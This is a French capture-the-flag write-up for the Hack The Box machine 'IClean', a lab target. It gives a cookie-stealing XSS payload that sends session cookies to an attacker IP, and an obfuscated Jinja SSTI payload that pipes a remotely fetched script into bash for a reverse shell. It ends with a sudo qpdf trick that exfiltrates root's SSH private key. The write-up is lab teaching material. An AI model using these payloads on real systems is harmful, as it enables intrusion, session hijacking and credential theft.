  # IClean

	echo "10.10.11.12 capiclean.htb" >> /etc/hosts
	sudo masscan -p1-65535,U:1-65535 10.10.11.12 -e tun0 > ports.txt
	sudo nmap -p- -sV -T4 -A 10.10.11.12 -oN nmap.txt
	dirb http://capiclean.htb
	
Scans classiques.

  
	PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
    80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))


Dossiers :


    + http://capiclean.htb/about (CODE:200|SIZE:5267)                                                                  
    + http://capiclean.htb/dashboard (CODE:302|SIZE:189)                                                               
    + http://capiclean.htb/login (CODE:200|SIZE:2106)                                                                  
    + http://capiclean.htb/logout (CODE:302|SIZE:189)                                                                  
    + http://capiclean.htb/quote (CODE:200|SIZE:2237)                                                                  
    + http://capiclean.htb/server-status (CODE:403|SIZE:278)                                                           
    + http://capiclean.htb/services (CODE:200|SIZE:8592)                                                               
    + http://capiclean.htb/team (CODE:200|SIZE:8109) 


"Quote" => http://capiclean.htb/quote => POST /sendMessage HTTP/1.1 => XSS


Payload : 

    service=<img+src%3dx+onerror%3dthis.src%3d"http%3a//10.10.16.14%3a8000/"%2bbtoa(document.cookie)>&email=bite@gmail.com

Réception du cookie : 

    10.10.11.12 - - [07/Apr/2024 14:09:23] "GET /c2Vzc2lvbj1leUp5YjJ4bElqb2lNakV5TXpKbU1qazNZVFUzWVRWaE56UXpPRGswWVRCbE5HRTRNREZtWXpNaWZRLlpoSE5Ldy41ai1pRDZvcVE5QzIxcFZGakVYSkFFNm05R28= HTTP/1.1" 404 -

Cookie décodé à ajouter : 
    
    session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.ZhHNKw.5j-iD6oqQ9C21pVFjEXJAE6m9Go


SSTI avec Unicode sur la fonctionnalité de génération d'un QR code : 


    POST /QRGenerator HTTP/1.1
    [...]
    invoice_id=&form_type=scannable_invoice&qr_link={{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("curl+10.10.16.14:8000/x.sh+|+bash")|attr("read")()}}&form_type=scannable_invoice&qr_link=a
    

Réception du shell en tant que www-data :

    rlwrap nc -nvlp 9999
    python -m http.server 8000
    whoami 


## Pivoting 

Mot de passe MySQL en clair dans ./app.py et bruteforcing d'un hash trouvé dans la base de données.

    ssh consuela@10.10.11.12
    cat user.txt
    
## Élévation de privilèges

Exploitation d'une fonctionnalité de QPDF pour ajouter la clé SSH de root en tant que fichier joint à un PDF.

	sudo -l

    sudo qpdf --add-attachment /root/.ssh/id_rsa --mimetype=text/plain -- /usr/share/doc/shared-mime-info/shared-mime-info-spec.pdf poc.pdf
    
    python3 -m http.server 8000

    [...]

    wget http://10.10.11.12:8000/poc.pdf
    
    okular poc.pdf
    
    vim id_rsa
    chmod 600 id_rsa

    ssh root@10.10.11.12 -i id_rsa
    
	cat /root/root.txt
    
    
    
